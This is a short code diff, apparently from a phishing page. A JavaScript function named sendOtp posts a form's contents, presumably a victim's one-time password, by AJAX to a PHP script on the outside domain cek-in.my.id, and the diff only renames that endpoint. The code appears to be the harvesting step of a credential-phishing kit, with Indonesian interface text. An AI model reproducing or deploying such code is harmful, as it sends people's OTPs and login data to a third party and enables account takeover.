@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://cek-in.my.id/p/req/empat.php',
+ url: 'https://cek-in.my.id/p/req/empatt.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
